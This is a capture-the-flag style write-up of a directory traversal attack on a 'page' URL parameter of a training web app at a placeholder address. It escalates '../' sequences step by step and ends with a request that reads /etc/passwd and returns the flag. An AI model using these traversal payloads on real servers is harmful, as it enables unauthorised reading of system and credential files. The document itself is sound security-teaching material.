# 08-Dir Access Attack - Resources

## 🕵️ Step 1: Initial Curiosity
We notice a page parameter in the URL:
```
http://x.x.x.x/?page=home
```
We test with `../` to see if we can break out:
```
http://x.x.x.x/?page=../
```
Response: "Wtf?"

👀 This means our input is being processed!

## 🔎 Step 2: Checking if We Can Go Higher
Trying `../../`:
```
http://x.x.x.x/?page=../../
```
Response: "Wtf?" again.

✔ This confirms that ../ is working but isn’t quite enough.

## 🤔 Step 3: The First Sign of Resistance
Trying `../../../`:
```
http://x.x.x.x/?page=../../../
```
Response: "Wrong.."

📌 Now we know we’re making progress.

## 🚀 Step 4: Almost There
We keep pushing:
```
http://x.x.x.x/?page=../../../../
http://x.x.x.x/?page=../../../../../
```
Responses: "Nope.." "Almost."

🎯 We are VERY close!

## 🔥 Step 5: The Final Clue
Trying `../../../../../../`:
```
http://x.x.x.x/?page=../../../../../../
```
Response: "Still nope.."

Trying `../../../../../../../`:
```
http://x.x.x.x/?page=../../../../../../../
```
Response: "Nope.."

Trying `../../../../../../../../`:
```
http://x.x.x.x/?page=../../../../../../../../
```
Response: "You can DO it!!! :]"

💡 This is the breakthrough!

## 🎯 Step 6: The Jackpot - Accessing /etc/passwd
Now, we add `/etc/passwd`:
```
http://x.x.x.x/?page=../../../../../../../../etc/passwd
```
Response: Congratulaton!! The flag is : ...

🏆 We’ve done it! Directory Traversal success!

## Key Takeaways
✅ The troll messages were our guide—they weren’t blocking us, just misleading us.
✅ We didn’t use any automated tools, just logical testing.
✅ By recognizing pattern changes, we pinpointed the correct depth before even testing `/etc/passwd`.
